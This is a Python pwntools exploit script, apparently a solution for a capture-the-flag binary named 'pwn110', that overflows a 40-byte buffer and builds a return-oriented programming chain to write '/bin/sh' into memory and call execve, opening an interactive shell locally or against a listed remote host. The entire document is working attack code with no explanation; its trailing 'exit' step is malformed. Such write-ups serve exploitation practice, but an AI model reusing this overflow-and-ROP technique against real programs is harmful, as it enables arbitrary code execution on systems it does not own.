#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF("./pwn110", checksec=False)

if args.REMOTE:
    p = remote("10.10.218.65", 9010)
else:
    p = process(binary.path)

rop = ROP(binary)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
mov_rdi_rdx = 0x4340a3  # mov qword ptr[rdi], rdx; ret;
mov_rax_rdi = 0x419ad4  # mov rax, rdi; ret;
mov_rdi8_rax = 0x417a8a # mov qword ptr[rdi+8], rax; ret;
mov_rdx_rax = 0x419748  # mov qword ptr[rdx], rax; ret
xor_rax_rax = 0x443e30  # xor rax, rax; ret
syscall = rop.find_gadget(["syscall", "ret"])[0]

sec_data = 0x4c00e0

payload = b""
payload += 40 * b"A"
payload += p64(pop_rdi)
payload += p64(sec_data)

payload += p64(pop_rdx)
payload += b"/bin/sh\x00"
payload += p64(mov_rdi_rdx)

payload += p64(mov_rax_rdi)
payload += p64(mov_rdi8_rax)

payload += p64(xor_rax_rax)
payload += p64(pop_rdx)
payload += p64(sec_data + 0x10)
payload += p64(mov_rdx_rax)

payload += p64(pop_rsi)
payload += p64(sec_data + 0x8)
payload += p64(pop_rax)
payload += p64(59) # execve
payload += p64(syscall)
payload += p64(60) # exit
payload += p64(syscall)

gdb.attach(p)
p.sendline(payload)
p.interactive()
